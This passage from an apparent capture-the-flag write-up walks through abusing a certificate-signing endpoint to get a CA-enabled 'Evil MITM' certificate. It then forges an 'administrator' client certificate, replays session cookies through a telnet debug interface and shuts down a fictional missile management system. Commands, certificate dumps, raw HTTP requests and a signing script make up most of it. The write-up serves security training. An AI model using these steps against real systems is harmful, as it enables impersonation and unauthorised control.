You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:.
State or Province Name (full name) [Some-State]:.
Locality Name (eg, city) []:.
Organization Name (eg, company) [Internet Widgits Pty Ltd]:.
Organizational Unit Name (eg, section) []:.
Common Name (e.g. server FQDN or YOUR name) []:Evil MITM
Email Address []:.

Please enter the following 'extra' attributes
to be sent with your certificate request
A challenge password []:
An optional company name []:
root@kali:/media/sf_CTFs/mossad/2# openssl req -text -noout -in intermediate_csr.pem | grep CA -B 3
        Attributes:
        Requested Extensions:
            X509v3 Basic Constraints: critical
                CA:TRUE, pathlen:1
```

Now we request the server to sign our CSR:

```console
root@kali:/media/sf_CTFs/mossad/2# curl 'https://dev.missilesys.com/download_cert' -H 'Connection: keep-alive' -H 'Content-Type: application/x-www-form-urlencoded' --data 'username=user&password=pass' --insecure --data-urlencode privatekey@intermediate_key.pem --data-urlencode csr@intermediate_csr.pem --output intermediate.p12
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  6108    0  3213  100  2895   3811   3434 --:--:-- --:--:-- --:--:--  7245
root@kali:/media/sf_CTFs/mossad/2#  openssl pkcs12 -in intermediate.p12 -clcerts -nokeys -out intermediate.pem
Enter Import Password:
root@kali:/media/sf_CTFs/mossad/2# openssl x509 -in intermediate.pem -text -noout
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number: 1 (0x1)
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: O = International Weapons Export Inc.
        Validity
            Not Before: May 12 19:42:38 2019 GMT
            Not After : May 11 19:42:38 2020 GMT
        Subject: CN = Evil MITM
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                RSA Public-Key: (2048 bit)
                Modulus:
                    00:cb:87:89:23:0d:e0:e9:dd:e0:09:bb:26:df:86:
                    72:6e:7e:52:b0:f7:1e:98:54:89:00:c8:9f:48:b6:
                    8d:83:c5:76:55:0b:65:9f:b2:72:28:42:c3:ab:a7:
                    68:ef:b1:2b:1c:34:b1:f6:c9:77:6f:a4:1a:7e:8d:
                    21:38:04:88:31:3d:a1:63:bd:22:df:6f:de:d2:ed:
                    57:ad:9b:93:64:03:4e:02:b4:d8:af:f3:d5:bc:a0:
                    50:cd:df:74:37:85:a1:aa:98:cc:a5:4b:d4:cc:88:
                    8a:04:3d:2e:aa:bc:06:6a:a2:52:c0:44:92:37:8f:
                    10:72:28:e7:15:e2:ad:b7:b5:24:b3:ff:fc:29:09:
                    d1:c2:42:96:bf:05:9f:1a:75:3b:3a:65:a9:5b:d2:
                    7c:4a:47:ac:1c:d4:f9:a1:64:83:5a:11:cf:8b:f6:
                    ab:09:80:23:a1:c6:8e:d2:41:39:e1:05:96:28:84:
                    a6:6d:8b:83:11:6f:2b:a9:30:4f:4d:2e:e6:75:59:
                    e2:79:15:f0:db:88:13:24:ce:3c:83:68:b2:54:31:
                    9d:b5:0e:3a:44:5a:b3:64:22:11:ef:98:4f:0d:55:
                    6f:94:b6:a6:fd:f6:54:0d:95:c4:68:f7:ba:49:10:
                    b8:a9:fb:f8:25:51:5e:46:cd:6d:24:4b:64:17:49:
                    06:03
                Exponent: 65537 (0x10001)
        X509v3 extensions:
            X509v3 Basic Constraints:
                CA:TRUE
            X509v3 Subject Key Identifier:
                01:12:D6:0D:F5:04:76:E2:5C:3B:68:7B:37:F3:AB:C4:B4:E6:31:13
    Signature Algorithm: sha256WithRSAEncryption
         7d:2e:1e:c9:df:d0:20:29:a0:5e:11:87:a1:d3:e2:3f:76:c6:
         2d:5d:da:d5:53:51:5c:6b:b1:5c:e9:37:9d:69:ed:43:fe:e1:
         ab:75:4f:22:42:43:cf:f4:6f:4f:a8:fc:70:82:a1:82:bc:26:
         6f:7c:7e:7c:13:52:96:b3:16:85:af:fe:78:93:0b:06:05:c9:
         aa:99:ed:86:84:66:54:14:ca:5b:58:5f:56:1c:c8:ad:5b:9a:
         84:b1:2b:e8:19:95:37:2a:f9:73:99:14:7c:d7:e2:8e:d5:09:
         9b:29:02:ac:43:91:f1:df:ed:5c:2e:b0:70:33:d5:5b:16:56:
         25:c7:2c:1e:92:01:8c:e3:27:05:06:0e:53:0f:0b:93:d2:03:
         d2:14:97:b9:9f:d5:d9:9f:2b:c5:26:a8:3c:09:23:13:b2:16:
         87:32:39:73:e4:e0:ac:4a:c6:c1:35:24:f5:4e:38:3f:87:7e:
         7b:b9:8e:1a:46:e2:c6:5c:fb:7f:c9:63:eb:e0:72:8b:3a:43:
         34:6a:b3:1d:61:13:39:de:d0:48:0f:27:81:52:ac:62:c2:9c:
         e4:ae:92:8d:45:77:52:e2:0d:e2:ca:13:3b:33:da:a5:02:8d:
         12:ed:00:f9:3e:4d:36:e3:89:79:7c:b1:cd:22:e3:94:3a:86:
         6f:1b:a4:9d
```

We got a certificate with CA = TRUE!

Now we create a leaf with CN = administrator:
```console
root@kali:/media/sf_CTFs/mossad/2# openssl genrsa -out leaf_key.pem 2048
Generating RSA private key, 2048 bit long modulus (2 primes)
...............................................+++++
........................+++++
e is 65537 (0x010001)
root@kali:/media/sf_CTFs/mossad/2# openssl req -new -key leaf_key.pem -out leaf_csr.pem
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:.
State or Province Name (full name) [Some-State]:.
Locality Name (eg, city) []:.
Organization Name (eg, company) [Internet Widgits Pty Ltd]:.
Organizational Unit Name (eg, section) []:.
Common Name (e.g. server FQDN or YOUR name) []:administrator
Email Address []:.

Please enter the following 'extra' attributes
to be sent with your certificate request
A challenge password []:
An optional company name []:
root@kali:/media/sf_CTFs/mossad/2# cat leaf.ext
basicConstraints=CA:FALSE
subjectKeyIdentifier=hash
root@kali:/media/sf_CTFs/mossad/2# openssl x509 -req -in leaf_csr.pem -CA intermediate.pem -CAkey intermediate_key.pem -CAcreateserial -out leaf.pem  -days 1825 -sha256 -extfile leaf.ext
Signature ok
subject=CN = administrator
Getting CA Private Key
```

Double check that the leaf looks ok:
```console
root@kali:/media/sf_CTFs/mossad/2# openssl x509 -in leaf.pem -text -noout
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number:
            45:c9:6a:20:cc:15:ba:7d:08:79:a7:53:b7:19:91:b9:20:60:45:40
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: CN = Evil MITM
        Validity
            Not Before: May 12 19:49:48 2019 GMT
            Not After : May 10 19:49:48 2024 GMT
        Subject: CN = administrator
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                RSA Public-Key: (2048 bit)
                Modulus:
                    00:ce:4a:cd:69:f9:b8:a4:fd:3d:bb:79:a2:a7:43:
                    7b:67:3c:81:18:27:f8:79:83:58:cd:0a:a7:b0:21:
                    0a:08:c2:d3:d3:f6:28:d4:47:48:ac:14:1f:1c:dc:
                    ef:21:99:39:70:9e:c4:b4:c8:6e:ce:da:1e:77:01:
                    fe:e3:c2:1c:95:5e:0d:91:47:d5:ee:c7:8b:da:c9:
                    30:f6:ac:ea:43:c9:3e:08:c1:23:7a:e2:bb:3a:69:
                    2b:0d:38:16:53:91:cb:10:c3:b0:c4:34:13:29:3a:
                    eb:ec:56:15:35:a0:8a:de:60:5b:08:2d:e2:af:52:
                    db:a0:54:1c:f2:44:71:fd:c2:69:da:99:ff:c4:08:
                    93:67:14:16:c7:14:63:46:53:b6:df:f4:48:aa:c0:
                    b8:5f:a7:0d:55:31:13:a2:d7:d9:4b:47:6f:a0:2a:
                    a4:60:e7:e1:22:df:f7:39:da:b5:5e:71:6e:e5:85:
                    cf:a4:37:7b:b7:12:4a:9e:83:0b:ad:2a:a4:e0:ef:
                    9c:b9:b7:3f:e6:26:a4:6c:2d:fa:86:d2:65:e4:64:
                    38:7d:14:c9:3e:22:4e:33:d1:00:84:e0:62:13:8a:
                    07:ca:f1:c9:5c:bc:2b:bb:d8:ff:2d:1a:95:ac:83:
                    9e:41:98:4c:81:fa:8d:22:8c:b9:33:2c:c3:09:ff:
                    cc:8d
                Exponent: 65537 (0x10001)
        X509v3 extensions:
            X509v3 Basic Constraints:
                CA:FALSE
            X509v3 Subject Key Identifier:
                40:18:7D:C1:BD:8C:70:DA:02:47:E0:7C:65:F2:64:F9:13:7F:D4:4A
    Signature Algorithm: sha256WithRSAEncryption
         59:b1:99:89:bd:19:3c:4d:81:8e:ea:89:e4:20:7d:1d:8a:b5:
         35:a3:b6:38:50:6c:fe:7b:f6:fe:99:ea:9e:3d:f8:43:6c:a4:
         4e:c9:7b:d0:52:eb:6b:b4:90:7c:a7:7e:f9:c5:3f:55:25:4f:
         60:71:1a:e4:48:a2:72:7f:9d:8e:3d:d5:e5:e5:9e:9d:a2:61:
         d0:ca:ff:ed:33:79:2d:d3:90:74:6e:4c:b0:c2:d2:c4:f2:7e:
         59:44:89:64:d3:0a:fb:fe:32:d3:ed:5c:88:99:bd:89:28:9d:
         f6:72:5c:24:ac:06:fe:6a:d1:e0:ea:c7:54:30:db:ac:52:f4:
         83:6f:41:d8:e0:45:23:0b:07:bc:60:aa:f3:e8:8d:af:53:2e:
         a1:4f:c9:28:91:ce:14:ef:26:9a:64:19:a8:4a:76:72:f1:cf:
         9f:d4:26:b2:fe:0b:bd:3f:5e:67:d2:e0:d2:b0:4b:df:a0:99:
         09:14:48:8f:82:6d:6c:b2:02:14:3c:60:a0:d9:f4:45:42:ba:
         10:ec:47:b0:e7:2a:a3:a2:d0:4e:bc:7a:02:56:41:ec:4e:85:
         b1:3c:81:45:85:75:d1:ab:0c:c9:a6:0d:24:b9:3e:74:84:70:
         3a:a0:c7:98:ad:83:35:1c:88:1e:80:b9:53:e7:b6:fa:47:95:
         53:85:fa:78
```

We create a PKCS#12 file:
```console
root@kali:/media/sf_CTFs/mossad/2# openssl pkcs12 -export  -inkey leaf_key.pem -in leaf.pem -certfile intermediate.pem -out final.pfx
Enter Export Password:
Verifying - Enter Export Password:
```

Now we import it in the browser and try to access the settings:

![](images/missle_settings.png)

We're in!

We have access to a telnet debug interface which allows entering an IP and port, and a list of IPs and ports.

Anything but the first one (Management Status - Managed by 10.0.0.1:80) returns "Only one connection at a time is allowed". Therefore, we'll investigate the first interface.

Since the port is 80, we can try to issue raw HTTP commands:

```
GET / HTTP/1.0
```

We receive the following response (truncated):

```
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 5374
Set-Cookie: SID=Z0FBQUFBQmMySHNiWklXai05a3kwZ3paWll5NnlzMnZjcnNBOFZxaEZ4SDRVbV84Rlp1UzhLbG5STy1Nc2lHTVRZTFozOHZXYVBkZi1NckRzOTc3S09raW56MzZPXzBWdlppR05rS1dUUUlPS2FXNW9SUXBPd1J1Y1gxejdBVENVVFIwSDU1ZHpLajY3VFNoN0dKUnBVa0hPemZtalVTNVkxaHl1RHQtNU1hbE1xWDhCVzY1c2RFPQ==; Domain=.missilesystem.com; Expires=Tue, 11-Jun-2019 19:59:23 GMT; Path=/
Date: Sun, 12 May 2019 19:59:23 GMT
Server: Cheroot/6.5.4

<html>
    <!-- ... -->
	<body>
		<div id="title" class="level1_title">
			<div id="welcome">
				<span>Welcome to Management System!</span>
			</div>
            <div id="settings"><span><a href="/settings">settings</a></span></div>
		</div>
		<div id="status">
			<div id="managemenetstatus">
				<div id="managemenetstatus_title" class="level2_title">
					<span class="name">Management Status</span>
					<span class="value">OK</span>
				</div>
				<div id="managemenetstatus_content">
					<div id="earlywarning_status" class="level3_title">
						<span class="name">Missile System</span>
						<span class="value">OK</span>
					</div>
				</div>
			</div>
		</div>
	</body>
</html>
```

Let's try to access the setting page:

```
GET /settings HTTP/1.1
```

The response:
```
HTTP/1.1 302 FOUND Content-Type: text/html; charset=utf-8 Content-Length: 237 Location: http://10.0.0.1 Date: Sun, 12 May 2019 20:01:13 GMT Server: Cheroot/6.5.4 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"> <title>Redirecting...</title> <h1>Redirecting...</h1> <p>You should be redirected automatically to target URL: <a href="http://10.0.0.1">http://10.0.0.1</a>. If not click the link.
```

But what if we send the cookie this time?
```
GET /settings HTTP/1.0
Cookie: SID=Z0FBQUFBQmMySHNiWklXai05a3kwZ3paWll5NnlzMnZjcnNBOFZxaEZ4SDRVbV84Rlp1UzhLbG5STy1Nc2lHTVRZTFozOHZXYVBkZi1NckRzOTc3S09raW56MzZPXzBWdlppR05rS1dUUUlPS2FXNW9SUXBPd1J1Y1gxejdBVENVVFIwSDU1ZHpLajY3VFNoN0dKUnBVa0hPemZtalVTNVkxaHl1RHQtNU1hbE1xWDhCVzY1c2RFPQ==; Domain=.missilesystem.com; Expires=Tue, 11-Jun-2019 19:59:23 GMT; Path=/
```

We get a response:

```
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 5203
Set-Cookie: SID=Z0FBQUFBQmMySHUtTlJUamp1My11eF9Yc250dFFOOVZMUVI2ZmZlV0pSd0NQMXVZT2RJQWplMmxqTXpadlNEckdtazdYRTd1VmRLNmd6eEZVWFR2QVBIQjljcFVrT0VQbTJhMlNwRTFLV1ludGZITWg0QnJHRjhhSGg1djVwcEFaOGhIWldnSm44RG5xdDVjS0lib2hGamZ0ZkllS0VQRGQzbjRhN20xRnNaZHQ4VFVSd3BiVkhrPQ==; Domain=.missilesystem.com; Expires=Tue, 11-Jun-2019 20:02:06 GMT; Path=/
Date: Sun, 12 May 2019 20:02:06 GMT
Server: Cheroot/6.5.4

<html>
    <!-- ... -->
	<body>
		<div id="title" class="level1_title">
			<div id="welcome">
				<span>Management System Settings</span>
			</div>
		</div>
		<div id="status">
			<div id="telnetdebugging">
				<div id="telnetdebugging_title" class="level2_title"><span>Telnet Debugging</span></div>
				<div id="telnet">
					<form  method="post">
						<div id="console">
							<input type="submit" value="Turn Off Management System"></input>
						</div>
					</form>
				</div>
			</div>
		</div>
	</body>
</html>
```

We have a big button saying "Turn Off Management System", let's click it:

```
POST /settings HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
Cookie: SID=Z0FBQUFBQmMySHUtTlJUamp1My11eF9Yc250dFFOOVZMUVI2ZmZlV0pSd0NQMXVZT2RJQWplMmxqTXpadlNEckdtazdYRTd1VmRLNmd6eEZVWFR2QVBIQjljcFVrT0VQbTJhMlNwRTFLV1ludGZITWg0QnJHRjhhSGg1djVwcEFaOGhIWldnSm44RG5xdDVjS0lib2hGamZ0ZkllS0VQRGQzbjRhN20xRnNaZHQ4VFVSd3BiVkhrPQ==; Domain=.missilesystem.com; Expires=Tue, 11-Jun-2019 20:02:06 GMT; Path=/
```

The success page is shown!

![](images/success2.png)


## Appendix A
Since it's a nightmare using the OpenSSL command line, the following script can be used to sign certificates in a much more intuitive way:

```python
import datetime

from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes

def create_self_signed_cert():
     # create a key pair
     k = crypto.PKey()
     k.generate_key(crypto.TYPE_RSA, 2048)

     # create a self-signed cert
     cert = crypto.X509()
     cert.get_subject().O = 'Org'
     cert.get_subject().OU = 'Org Unit'*50
     cert.get_subject().CN = 'Common Name'
     cert.set_serial_number(1000)
     cert.gmtime_adj_notBefore(0)
     cert.gmtime_adj_notAfter(10*365*24*60*60)
     cert.set_issuer(cert.get_subject())
     cert.set_pubkey(k)
     cert.sign(k, 'sha256')

     open("self_signed.pem", "w").write(
         crypto.dump_certificate(crypto.FILETYPE_PEM, cert))
     open("self_signed_key.pem", "w").write(
         crypto.dump_privatekey(crypto.FILETYPE_PEM, k))

leaf_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=4096,
    backend=default_backend())

with open("leaf_key.pem", "wb") as f:
    f.write(leaf_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.TraditionalOpenSSL,
        encryption_algorithm=serialization.BestAvailableEncryption(b"pass"),))

with open("intermediate_key.pem", "rb") as key_file:
    ca_key = serialization.load_pem_private_key(
            key_file.read(),
            password=None,
            backend=default_backend())

cert_req = x509.Name([
        x509.NameAttribute(NameOID.ORGANIZATION_NAME, u"Evil Corporation"),
        x509.NameAttribute(NameOID.COMMON_NAME, u"administrator")
    ])

with open("intermediate.pem", "rb") as cer_file:
    ca_cert = x509.load_pem_x509_certificate(cer_file.read(), default_backend())


backend = default_backend()

cert = x509.CertificateBuilder().subject_name(
    cert_req
).issuer_name(
    ca_cert.subject
).public_key(
    leaf_key.public_key()
).serial_number(
    x509.random_serial_number()
).not_valid_before(
    datetime.datetime.utcnow()
).not_valid_after(
    datetime.datetime.utcnow() + datetime.timedelta(days=356)
).add_extension(
    x509.BasicConstraints(ca=False, path_length=None),
    critical=False,
).add_extension(
    x509.SubjectKeyIdentifier.from_public_key(leaf_key.public_key()),
    critical=False,
).add_extension(
    x509.AuthorityKeyIdentifier.from_issuer_public_key(ca_key.public_key()),
    critical=False,
).sign(ca_key, hashes.SHA256(), backend)
# Write our certificate chain to disk.
#with open("certificate{}.pem".format(i), "wb") as f:
#    f.write(cert_arr[i].public_bytes(serialization.Encoding.PEM) + ''.join([cert_arr[j].public_bytes(serialization.Encoding.PEM) for j in range(i-1, -1, -1)]))

with open("leaf.pem", "wb") as f:
    f.write(cert.public_bytes(serialization.Encoding.PEM))
```